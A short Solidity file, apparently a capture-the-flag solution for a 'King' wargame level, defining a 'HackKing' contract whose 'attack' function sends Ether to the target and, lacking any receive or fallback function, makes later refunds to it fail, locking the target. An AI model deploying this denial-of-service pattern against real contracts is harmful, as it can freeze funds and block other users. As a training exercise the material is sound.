// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {King} from "./King.sol";

contract HackKing {
    function attack(address payable _target) external payable {
        (bool ok,) = _target.call{value: msg.value}("");
        if (!ok) revert();
    }
}
